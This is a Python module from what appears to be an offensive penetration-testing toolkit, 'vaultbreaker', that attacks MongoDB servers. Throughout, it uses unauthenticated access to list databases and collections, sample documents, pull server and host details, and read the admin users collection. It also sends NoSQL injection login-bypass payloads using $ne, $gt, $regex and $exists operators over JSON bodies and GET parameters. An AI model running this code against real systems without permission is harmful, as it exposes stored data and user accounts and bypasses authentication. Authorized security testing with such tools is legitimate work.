"""MongoDB offensive -- unauthenticated access, NoSQL injection, enumeration."""
from __future__ import annotations

import re
from typing import Optional

from vaultbreaker.models import AttackResult, Credential, EngagementContext
from vaultbreaker.logger import info, ok, warn, crit, section, console
from vaultbreaker.modules.base import BaseModule
from vaultbreaker.data import http_request


class MongoModule(BaseModule):
    """MongoDB offensive -- unauthenticated access, NoSQL injection, enumeration."""

    name = "mongo"

    def run(self, ctx: EngagementContext) -> None:
        section("MongoDB Module")
        for target in ctx.targets:
            host = target.split("://")[-1].split("/")[0].split(":")[0]
            port = 27017
            for p in ctx.ports:
                if p in (27017, 27018, 27019):
                    port = p
                    break
            info(f"Target: {host}:{port}")
            self._unauth_access(ctx, host, port)
            self._nosql_injection_http(ctx, target)

    def _unauth_access(self, ctx: EngagementContext, host: str, port: int):
        try:
            import pymongo
            client = pymongo.MongoClient(host, port, serverSelectionTimeoutMS=ctx.timeout * 1000,
                                         socketTimeoutMS=ctx.timeout * 1000)
            server_info = client.server_info()
            ctx.add_result(AttackResult(
                "mongo", "Unauthenticated Access", "critical", "critical",
                f"MongoDB {server_info.get('version', '?')} open without authentication"
            ))
            self._enumerate_databases(ctx, client, host, port)
            self._extract_server_info(ctx, client)
            self._enumerate_users(ctx, client)
            client.close()
        except ImportError:
            ctx.add_result(AttackResult("mongo", "Unauthenticated Access", "fail", "info",
                                        "pymongo not installed"))
        except Exception as e:
            err_str = str(e)
            if "Authentication" in err_str or "auth" in err_str.lower():
                ctx.add_result(AttackResult("mongo", "Unauthenticated Access", "ok", "info",
                                            "Authentication is required (good)"))
            elif "ServerSelectionTimeout" in type(e).__name__:
                ctx.add_result(AttackResult("mongo", "Unauthenticated Access", "fail", "info",
                                            f"Cannot connect to {host}:{port}"))
            else:
                ctx.add_result(AttackResult("mongo", "Unauthenticated Access", "fail", "low",
                                            f"Connection error: {e}"))

    def _enumerate_databases(self, ctx: EngagementContext, client, host: str, port: int):
        try:
            db_names = client.list_database_names()
            ctx.add_result(AttackResult(
                "mongo", "Database Enumeration", "ok", "high",
                f"Found {len(db_names)} databases: {', '.join(db_names[:20])}"
            ))
            for db_name in db_names:
                if db_name in ("admin", "local", "config"):
                    continue
                db = client[db_name]
                try:
                    collections = db.list_collection_names()
                    ctx.add_result(AttackResult(
                        "mongo", "Collection Enumeration", "ok", "medium",
                        f"{db_name}: {len(collections)} collections — {', '.join(collections[:15])}"
                    ))
                    for coll_name in collections[:5]:
                        try:
                            sample = list(db[coll_name].find().limit(5))
                            if sample:
                                fields = list(sample[0].keys()) if sample else []
                                ctx.add_result(AttackResult(
                                    "mongo", "Document Sampling", "ok", "high",
                                    f"{db_name}.{coll_name}: {len(sample)} docs sampled, "
                                    f"fields: {', '.join(str(f) for f in fields[:10])}"
                                ))
                        except Exception:
                            pass
                except Exception:
                    pass
        except Exception as e:
            ctx.add_result(AttackResult("mongo", "Database Enumeration", "fail", "info",
                                        f"Enumeration failed: {e}"))

    def _extract_server_info(self, ctx: EngagementContext, client):
        try:
            build_info = client.admin.command("buildInfo")
            ctx.add_result(AttackResult(
                "mongo", "Server Info — buildInfo", "ok", "medium",
                f"version={build_info.get('version')}, "
                f"modules={build_info.get('modules', [])}, "
                f"openssl={build_info.get('openssl', {}).get('running', 'N/A')}"
            ))
        except Exception:
            pass
        try:
            server_status = client.admin.command("serverStatus")
            connections = server_status.get("connections", {})
            ctx.add_result(AttackResult(
                "mongo", "Server Info — serverStatus", "ok", "medium",
                f"uptime={server_status.get('uptime', '?')}s, "
                f"connections: current={connections.get('current', '?')}, "
                f"available={connections.get('available', '?')}"
            ))
        except Exception:
            pass
        try:
            host_info = client.admin.command("hostInfo")
            sys_info = host_info.get("system", {})
            os_info = host_info.get("os", {})
            ctx.add_result(AttackResult(
                "mongo", "Server Info — hostInfo", "ok", "high",
                f"hostname={sys_info.get('hostname', '?')}, "
                f"os={os_info.get('name', '?')} {os_info.get('version', '')}, "
                f"cpus={sys_info.get('numCores', '?')}, "
                f"mem={sys_info.get('memSizeMB', '?')}MB"
            ))
        except Exception:
            pass

    def _enumerate_users(self, ctx: EngagementContext, client):
        try:
            users_coll = client["admin"]["system.users"]
            users = list(users_coll.find({}, {"user": 1, "db": 1, "roles": 1}))
            if users:
                user_list = [f"{u.get('user', '?')}@{u.get('db', '?')}" for u in users[:10]]
                ctx.add_result(AttackResult(
                    "mongo", "User Enumeration", "ok", "critical",
                    f"Found {len(users)} users: {', '.join(user_list)}"
                ))
        except Exception:
            pass

    def _nosql_injection_http(self, ctx: EngagementContext, target: str):
        if not target.startswith("http"):
            return
        nosql_payloads = [
            {"username": {"$ne": ""}, "password": {"$ne": ""}},
            {"username": {"$gt": ""}, "password": {"$gt": ""}},
            {"username": {"$regex": ".*"}, "password": {"$regex": ".*"}},
            {"username": {"$exists": True}, "password": {"$exists": True}},
        ]
        for payload in nosql_payloads:
            resp = http_request(target, method="POST", json_body=payload,
                                 headers={"Content-Type": "application/json"},
                                 timeout=ctx.timeout)
            if resp and resp.status_code == 200 and len(resp.text or "") > 100:
                ctx.add_result(AttackResult(
                    "mongo", "NoSQL Injection (HTTP)", "critical", "critical",
                    f"Possible NoSQL injection bypass with operator: {list(list(payload.values())[0].keys())[0]}"
                ))
                return
        param_payloads = [
            "username[$ne]=&password[$ne]=",
            "username[$gt]=&password[$gt]=",
            "username[$regex]=.*&password[$regex]=.*",
        ]
        for payload in param_payloads:
            resp = http_request(f"{target}?{payload}", timeout=ctx.timeout)
            if resp and resp.status_code == 200 and len(resp.text or "") > 100:
                ctx.add_result(AttackResult(
                    "mongo", "NoSQL Injection (GET params)", "critical", "critical",
                    f"Possible NoSQL injection via GET parameter operators"
                ))
                return
        ctx.add_result(AttackResult("mongo", "NoSQL Injection (HTTP)", "fail", "info",
                                    "No NoSQL injection vectors confirmed via HTTP"))
